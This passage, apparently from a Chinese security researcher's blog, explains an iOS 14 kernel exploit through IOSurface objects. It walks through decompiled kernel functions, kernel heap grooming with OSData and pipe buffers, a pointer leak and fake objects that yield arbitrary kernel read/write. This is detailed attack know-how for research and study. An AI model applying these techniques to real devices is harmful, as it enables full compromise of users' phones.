<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">kern_return_t</span> __fastcall <span class="title">IOSurfaceClient::setCompressedTileDataRegionMemoryUsageOfPlane</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        IOSurfaceClient *a1,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">unsigned</span> <span class="type">int</span> a2,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> IOSurface::<span class="built_in">setCompressedTileDataRegionMemoryUsedOfPlane</span>(a1-&gt;m.surface, a2, a3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>IOSurface::setCompressedTileDataRegionMemoryUsedOfPlane:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">kern_return_t</span> __fastcall <span class="title">IOSurface::setCompressedTileDataRegionMemoryUsedOfPlane</span><span class="params">(IOSurface *a1, <span class="type">unsigned</span> <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  result = <span class="number">0xE00002C2</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">4</span> &amp;&amp; a1-&gt;dwordB0 &gt; a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">    *(_DWORD *)(a1-&gt;qwordC0 + <span class="number">4LL</span> * a2 + <span class="number">0x98</span>) = a3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们同时控制了a2和a3，所以如果我们控制传递给这个函数的IOSurface对象，我们就有了一个任意的32位内核写入。</p>
<p>还记得每个IOSurfaceRootUserClient是如何跟踪它所拥有的IOSurface对象的吗？每一次从IOSurfaceClient数组中的读取都是在边界检查的保护下进行的。如果我们以某种方式泄露了我们拥有的IOSurfaceRootUserClient的地址，我们可以使用类型混淆的32位增量来提高其surface_client_array_capacity字段。这将人为地创造一个越过其surface_client_array末端的越界读取，所以我们可以索引到一个我们控制的缓冲区。</p>
<p>因此，这个漏洞的目标是构建一个假的IOSurfaceClient对象（它将携带一个指向假的IOSurface对象的指针），我们可以使用IOSurfaceRootUserClient外部方法对其进行索引。</p>
<h2 id="Stage-1-塑形内核VA"><a href="#Stage-1-塑形内核VA" class="headerlink" title="Stage 1: 塑形内核VA"></a>Stage 1: 塑形内核VA</h2><p>第一阶段的目标是创建一个可预测的大型IOSurfaceClient数组的布局，并控制缓冲区极其接近OSData缓冲区，该缓冲区与我们猜测的内核指针相对应。很明显，我们需要在其他事情之前找到这个OSData缓冲区。选择0x10000字节的分配对内核map喷洒500MB数据，因为我们将在喷射IOSurfaceClient数组时使用这个大小。这个大小是任意选择的，没有什么意义。然而，根据特定启动的内核map碎片，猜测不会总是落在0x10000字节的OSData缓冲区的第一页。因此，对于每个OSData缓冲区的每一页。</p>
<ul>
<li>偏移量0x0保持一个常数。</li>
<li>偏移量0X4保存页面编号。</li>
<li>偏移量0x8持有用于IOSurfaceRootUserClient外部方法9、10和11的密钥。</li>
</ul>
<p>在500MB被喷完后，猜测的内核指针被使用，并有32位增量。如果猜测落在一个未映射的页面上，就会导致Panic，但如果它落在我们的一个已喷涂的缓冲区上，那么这些页面开始的那个常量值就会被递增了。我们用IOSurfaceRootUserClient::s_get_value读回所有的OSData缓冲区，并检查这个变化。一旦我们找到被写入的缓冲区的页面，我们就用偏移量0x4的页码来计算第一个页面的地址。</p>
<p>从现在开始，将把与我们猜测的内核指针相对应的OSData缓冲区称为 “锚点分配”。</p>
<p>我们现在处于一个非常好的位置。我们知道锚点分配在内核内存中的地址，并且由于vm_map_find_space的可预测性，这些OSData缓冲区极有可能按照它们被分配的顺序排列。这就是在这个漏洞中最依赖的东西。因为知道锚点分配的地址，所以知道与它相邻的所有OSData缓冲区的地址。如果想要左边的第n个OSData缓冲区，那么就从锚点分配的地址中减去<code>0x10000*n</code>字节。如果我想把第n个OSData缓冲区放在右边，那么我就把<code>0x10000*n</code>字节加到锚点分配的地址上。</p>
<p>此外，如果我们释放了一个OSData缓冲区，我们应该能够很容易地收回那个缓冲区，因为vm_map_find_space的 “寻找第一个可能的地址  “的思想。</p>
<p><img src="https://jsherman212.github.io/assets/popping_ios14_with_iomfb/stage1_fig1.png"></p>
<p>如果逆向过IOSurface kext，或者看过内核日志，可能知道每个IOSurfaceRootUserClient有4096个IOSurface对象的限制。一旦我们达到了一个IOSurfaceRootUserClient的限制，我们就可以创建另一个，并继续用新的IOSurface对象。同样，对于我们创建的每一个IOSurface对象，都会有一个IOSurfaceClient对象。但是，即使我们创建了4096个IOSurface对象，sizeof(IOSurfaceClient *) * 4096也只有0x8000字节，而不是0x10000字节。那么是什么原因呢？</p>
<p>原因在IOSurfaceRootUserClient::alloc_handles里:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">IOSurfaceRootUserClient::alloc_handles</span><span class="params">(IOSurfaceRootUserClient *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  surface_client_array_capacity = a1-&gt;m.provider-&gt;m.surface_client_array_capacity;</span><br><span class="line">  surface_client_array = a1-&gt;m.surface_client_array;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="built_in">IONewZero</span>(<span class="number">8</span> * surface_client_array_capacity);</span><br><span class="line">  a1-&gt;m.surface_client_array = v5;</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    a1-&gt;m.surface_client_array_capacity = surface_client_array_capacity;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>IOSurfaceRootUserClient::set_surface_handle是由IOSurfaceClient::init调用的，所以每次我们创建一个新的IOSurface对象时都会到达IOSurfaceRootUserClient::alloc_handles。</p>
<p>正是这一行使0x10000字节的IOSurfaceClient阵列成为可能:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">surface_client_array_capacity = a1-&gt;m.provider-&gt;m.surface_client_array_capacity;</span><br></pre></td></tr></table></figure>

<p>provider字段指向一个IOSurfaceRoot对象。创建的每个IOSurfaceRootUserClient对象都有相同的provider指针。那么，在创建一个新的IOSurface时，IOSurfaceRoot是如何发挥作用的？当你创建一个IOSurface时，首先要调用的一个函数是IOSurface::init。为了分配一个新的IOSurface ID，它调用IOSurfaceRoot::alloc_surfaceid。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">IOSurfaceRoot::alloc_surfaceid</span><span class="params">(IOSurfaceRoot *a1, <span class="type">unsigned</span> <span class="type">int</span> *new_surface_idp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">  v4 = a1-&gt;m.total_surfaces_created &gt;&gt; <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v4 &gt;= a1-&gt;m.surface_client_array_capacity &gt;&gt; <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_7:</span><br><span class="line">    <span class="keyword">if</span> ( (IOSurfaceRoot::<span class="built_in">alloc_handles</span>(a1) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">32</span> * v4;       <span class="comment">/* aka v6 = v4 &lt;&lt; 5 */</span></span><br><span class="line">  a1-&gt;m.total_surfaces_created = v6 + <span class="number">1</span>;</span><br><span class="line">  *new_surface_idp = v6;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为什么这个代码库将创建的IOSurface对象的总数移到左边五位，尚不明白，但我们看到IOSurfaceRoot有自己的alloc_handles实现。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">IOSurfaceRoot::alloc_handles</span><span class="params">(IOSurfaceRoot *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  surface_client_array_capacity = a1-&gt;m.surface_client_array_capacity;</span><br><span class="line">  <span class="keyword">if</span> ( surface_client_array_capacity )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( surface_client_array_capacity &gt;&gt; <span class="number">14</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    v3 = <span class="number">2</span> * surface_client_array_capacity;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">512</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="built_in">IONewZero</span>((v3 &gt;&gt; <span class="number">3</span>) + <span class="number">8LL</span> * v3);</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    a1-&gt;m.surface_client_array_capacity = v3;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，全系统有一个16384个IOSurface对象的限制，这就是surface_client_array_capacity &gt;&gt; 14的测试。对于超过512的2次方，IOSurfaceRoot的surface_client_array_capacity将增加一倍。因为我们创建的每个IOSurfaceRootUserClient都有相同的IOSurfaceRoot指针，他们都能在IOSurfaceRootUserClient::alloc_handles看到相同的surface_client_array_capacity字段。</p>
<p>因此，我们创建0x10000字节的IOSurfaceClient数组的方法很简单：创建两个IOSurfaceRootUserClient对象，并为它们各自分配4096个IOSurface对象。如果我们特别注意不触发他们的provider IOSurfaceRoot的surface_client_array_capacity的再次翻倍，那么未来任何新的IOSurfaceRootUserClient对象的所有IOSurfaceClient数组也将是0x10000字节。这里最棒的是，我们需要做的就是用一个新的IOSurfaceRootUserClient对象来做一个新的0x10000字节的IOSurfaceClient数组，只需要用它来分配一个IOSurface，因为在那个时候，IOSurfaceRoot的surface_client_array_capacity已经是8192。</p>
<p>尽管0x10000比kalloc_max_prerounded大，但有一个小问题：OSData缓冲区是由kernel_memory_allocate直接分配的，而IOSurfaceClient数组的分配是通过kalloc_ext的，所以会调用kalloc_large。还记得kalloc_large如何调用kalloc_map_for_size吗？</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">vm_map_t</span></span></span><br><span class="line"><span class="function"><span class="title">kalloc_map_for_size</span><span class="params">(<span class="type">vm_size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (size &lt; kalloc_kernmap_size) &#123;</span><br><span class="line">        <span class="keyword">return</span> kalloc_map;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> kernel_map;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>kalloc_kernmap_size又是0x100001字节，但我们要做的IOSurfaceClient数组只有0x10000字节，所以我们要从kalloc map而不是直接从内核map中分配。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">alloc_map = <span class="built_in">kalloc_map_for_size</span>(size);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ... */</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">kmem_alloc_flags</span>(alloc_map, &amp;addr, size, tag, kma_flags) != KERN_SUCCESS) &#123;</span><br><span class="line">    <span class="keyword">if</span> (alloc_map != kernel_map) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">kmem_alloc_flags</span>(kernel_map, &amp;addr, size, tag, kma_flags) != KERN_SUCCESS) &#123;</span><br><span class="line">            addr = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        addr = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以我们只需要让从kalloc地图的分配失败，落入第二个kmem_alloc_flags，它将永远从内核地图分配。让未来的kalloc地图分配失败的最好方法是把它完全填满。</p>
<p>为了填满kalloc地图，我们将使用携带线外端口的Mach消息。这是在iOS 13及以下版本中最过硬的策略之一，因为你可以得到一个Mach端口指针数组，放置在你想要的任何区域。尽管这在iOS 14及以上版本中已经失效，但port指针数组的分配仍然要通过kalloc_ext。经过一些测试，喷洒2000条携带8192个发送权的消息，始终能填满kalloc地图，因为消息中的每个发送权都会创建一个ipc_port指针。</p>
<p>现在kalloc地图被填满了，每一个超过32768字节的kalloc分配都会直接进入内核地图。这个难题的最后一块是要弄清楚我们要使用什么样的受控缓冲区。可以继续使用OSData缓冲区，但是需要大量的代码来读出、写入或释放它们，这与<a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/bsd/kern/sys_pipe.c#L308">管道</a>缓冲区不同…</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">unsigned</span> <span class="type">int</span> pipesize_blocks[] = &#123;<span class="number">512</span>, <span class="number">1024</span>, <span class="number">2048</span>, <span class="number">4096</span>, <span class="number">4096</span> * <span class="number">2</span>, PIPE_SIZE, PIPE_SIZE * <span class="number">4</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * finds the right size from possible sizes in pipesize_blocks</span></span><br><span class="line"><span class="comment"> * returns the size which matches max(current,expected)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">choose_pipespace</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> current, <span class="type">unsigned</span> <span class="type">long</span> expected)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="built_in">sizeof</span>(pipesize_blocks) / <span class="built_in">sizeof</span>(<span class="type">unsigned</span> <span class="type">int</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> target;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * assert that we always get an atomic transaction sized pipe buffer,</span></span><br><span class="line"><span class="comment">     * even if the system pipe buffer high-water mark has been crossed.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">assert</span>(PIPE_BUF == pipesize_blocks[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (expected &gt; current) &#123;</span><br><span class="line">        target = expected;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        target = current;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (i &gt; <span class="number">0</span> &amp;&amp; pipesize_blocks[i - <span class="number">1</span>] &gt; target) &#123;</span><br><span class="line">        i = i - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pipesize_blocks[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当你使用管道系统调用创建一个管道时，在你向其写入之前，不会为支持的管道缓冲区分配内存。第一次写入的大小首先决定了管道缓冲区的分配量有多大。这正是select_pipespace的作用，pipesize_blocks列出了可能的分配大小。但PIPE_SIZE是什么？</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Pipe buffer size, keep moderate in value, pipes take kva space.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PIPE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_SIZE       16384</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>pipesize_blocks的最后一个int是16384 * 4，即0x10000。因此，我们需要做的就是直接从内核地图中分配一个管道缓冲区，并向它写入0x10000字节。</p>
<p>因此，前面提到的 “可预测的布局”，将仅仅是并排的0x10000字节的IOSurfaceClient数组和管道缓冲区。一旦我们在我们拥有的某个IOSurfaceRootUserClient对象中提高了surface_client_array_capacity，那么无论这个容量对应的IOSurfaceClient数组后面的管道缓冲区是什么，我们都会被控制在越界读取的缓冲区。</p>
<p>为了让0x10000字节的IOSurfaceClient数组和管道缓冲区并排使用，我们所要做的就是释放大量的空间，然后交替分配0x10000字节的IOSurfaceClient数组和管道缓冲区。对于 “大量的空间”，使用锚点分配左侧的16MB。为什么是左边的16MB？实验得出来的。</p>
<p>在第一阶段结束时，锚点分配左侧的16MB将看起来像这样。</p>
<p><img src="https://jsherman212.github.io/assets/popping_ios14_with_iomfb/stage1_16mb.png"></p>
<h2 id="Stage-2-信息泄露"><a href="#Stage-2-信息泄露" class="headerlink" title="Stage 2: 信息泄露"></a>Stage 2: 信息泄露</h2><p>除了在偏移量0x40处携带一个指向它所管理的IOSurface对象的指针外，它还在偏移量0x10处携带一个指向拥有该Surface的IOSurfaceRootUserClient对象的指针。我们将在前面显示的IOSurface关系图中给IOSurfaceClient添加这个字段。</p>
<p><img src="https://jsherman212.github.io/assets/popping_ios14_with_iomfb/iosurface_bigger_picture_stage2.png"></p>
<p>大多数IOSurfaceRootUserClient外部方法都遵循这种模式:</p>
<ul>
<li>从IOSurfaceRootUserClient中读取IOSurfaceClient数组。</li>
<li>用用户空间的IOSurface ID索引到该数组中的一个IOSurfaceClient对象。</li>
<li>将IOSurfaceClient中的IOSurface指针传递给一个为该外部方法做工作的函数。</li>
</ul>
<p>如果步骤3中的IOSurface指针指向一个IOSurfaceRootUserClient，会怎么样？那些旨在从该Surface返回字段的外部方法会不会无意中泄露该用户客户端的有价值的字段？</p>
<p>第一阶段在塑造了内核的地址空间之后，实际上还做了一些工作：它将喷射大量的IOSurfaceClient对象，以创建一堆只有这些对象的页面。这样一来，对于一个任意的IOSurface ID，其对应的IOSurfaceClient与其他IOSurfaceClient对象相邻的机会就非常大了。而从现在开始，将把两个相邻的IOSurfaceClient对象称为 “一对”，其中一个在左边，另一个在右边。</p>
<p>现在我们使用重叠策略应用于其中一个对。因为没有办法知道一个surface ID是否会对应于一个对的左边，所以将做一个有根据的猜测。如果猜对了，就会有这样的东西，数组中的蓝色IOSurfaceClient指针指向左边的那个。</p>
<p><img src="https://jsherman212.github.io/assets/popping_ios14_with_iomfb/iosurface_bigger_picture_stage2_adjacent.png"></p>
<p>我们的想法是让内核在读取左边的IOSurfaceClient时，从左边的IOSurfaceClient的末端读到右边的IOSurfaceClient上。因为我们可以推导出surface客户端数组的地址，因为它与锚点分配器非常接近，我们将通过增加左边数组中的指针来实现这一目的。</p>
<ul>
<li>offsetof(IOSurfaceClient, IOSurface)是0x40</li>
<li>offsetof(IOSurfaceClient, IOSurfaceRootUserClient) 是0x10</li>
<li>每个IOSurfaceClient对象占用0xa0字节，因为它们住在kext.kalloc.160中。</li>
</ul>
<p>从左边的surface字段到它所在的kext.kalloc.160元素的末端的距离是0xa0-0x40，或者0x60字节。但这只是与左边的IOSurface字段重叠，只够读取右边的vtable指针的偏移量0x0，所以我们需要一个额外的0x10字节来读取右边的IOSurfaceRootUserClient字段。因此，我们将用32位递增原语将左边的指针递增0x70字节。之后，它将指向左边的一半多一点。</p>
<p><img src="https://jsherman212.github.io/assets/popping_ios14_with_iomfb/iosurface_bigger_picture_stage2_adjacent_overlap.png"></p>
<p>如果我们猜测的表面ID是错误的，那么在这一点上我们很快就会导致Panic，但如果它是正确的，我们现在可以通过使用与左边对应的表面ID从拥有的IOSurfaceRootUserClient中读取字节。对把IOSurfaceRootUserClient的外部方法当作黑匣子来看待，看到了很多乐趣，但没有什么能让准备好在调用IOSurfaceRootUserClient外部方法28，或者IOSurfaceRootUserClient::s_get_bulk_attachments之后，在0x80字节的结构输出中看到的东西。下面是部分内存转储:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x16eea33f8: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0x16eea3408: 00 00 00 00 AO 5C A2 CB E4 FF FF FF 00 F8 10 CC</span><br><span class="line">0x16eea3418: E4 FF FF FF 01 00 00 00 00 00 00 00 80 B2 7F 9A</span><br><span class="line">0x16eea3428: E1 FF FF FF 00 00 00 00 00 00 00 00 28 FB 13 CB</span><br><span class="line">0x16eea3438: E4 FF FF FF E0 A4 A4 CC E4 FF FF FF F8 A4 A4 CC</span><br><span class="line">0x16eea3448: E4 FF FF FF 00 40 3A E7 E8 FF FF FF 00 20 00 00</span><br><span class="line">0x16eea3458: 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0x16eea3468: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<p>该缓冲区包括许多内核指针，但我们感兴趣的是指向:</p>
<ul>
<li>一个IOSurfaceRoot对象，在偏移量0x1c。</li>
<li>一个我们拥有的IOSurfaceRootUserClient对象，在偏移量0x3c。</li>
<li>属于IOSurfaceRootUserClient的IOSurfaceClient数组，在偏移量0x54。<ul>
<li>该数组的容量（除以sizeof(IOSurfaceClient *)）也在偏移量0x5c。</li>
</ul>
</li>
</ul>
<p>唯一的问题是IOSurfaceRootUserClient指针移位了0xf8字节，但这很简单，从它那里减去0xf8就可以得到原始指针。</p>
<h2 id="Stage-3-iOS14-7一个简单技巧"><a href="#Stage-3-iOS14-7一个简单技巧" class="headerlink" title="Stage 3: iOS14.7一个简单技巧"></a>Stage 3: iOS14.7一个简单技巧</h2><p>我们带着指向我们拥有的IOSurfaceRootUserClient对象及其IOSurfaceClient数组的指针进入第三阶段。但这不是普通的IOSurfaceClient数组–它是我们在第1阶段喷出的一个数组，所以在它旁边会有一个管道缓冲器。虽然我们不确定哪个管道缓冲区就在旁边，但我们可以通过在泄露的IOSurfaceClient数组指针上添加0x10000来得出它的地址。我们在第3阶段做的第一件事是以如下方式设置我们在第1阶段喷涂的所有管道缓冲区。</p>
<ul>
<li>偏移量0x0包含衍生的管道缓冲区地址，加上8。</li>
<li>偏移量0x8包含一个假的IOSurfaceClient对象。</li>
<li>偏移量0xa8包含一个假的IOSurface对象。<ul>
<li>假的IOSurface的偏移量0xc0指向管道缓冲区的某个地方，把它的索引写在包含第一阶段所有喷涂管道的数组中。这样做是为了以后能弄清哪个管道缓冲区里有我们的假对象。</li>
</ul>
</li>
</ul>
<p>现在所有的管道缓冲区都设置好了，使用32位的增量，将泄露的IOSurfaceRootUserClient对象的容量提高了一个。</p>
<p>为了弄清楚哪个拥有的IOSurfaceRootUserClient被损坏了，在所有的IOSurfaceRootUserClient::get_surface_use_count中循环查看，当调用IOSurfaceRootUserClient::get_surface_use_count的surface ID索引到相邻的管道缓冲区的开始时，除了错误之外，是否得到其他的东西。如果没有错误，就找到了被破坏的那个，四个字节的输出是持有假IOSurfaceClient和IOSurface对象的管道的索引。</p>
<p>现在我们已经控制了一个IOSurface对象，我们可以用第0阶段谈到的外部方法设置任意的内核读写API。 这样，手机就被攻陷了，我们可以开始越狱。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这篇文章里的exp不是一个完整的越狱，而且，exp代码也有限制。</p>
</div></article></div><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous"><a href="/tags/ios/">Previous</a></div><div class="pagination-next is-invisible is-hidden-mobile"><a href="/tags/ios/page/3/">Next</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link" href="/tags/ios/">1</a></li><li><a class="pagination-link is-current" href="/tags/ios/page/2/">2</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="https://avatars.githubusercontent.com/u/19711495?v=4" alt="buffer0verflooow"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">buffer0verflooow</p><p class="is-size-6 is-block">Security Researcher</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Beijing</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">56</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">51</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ppoffice" target="_blank" rel="me noopener">Follow</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Github" href="https://github.com/ppoffice"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Twitter" href="https://twitter.com"><i class="fab 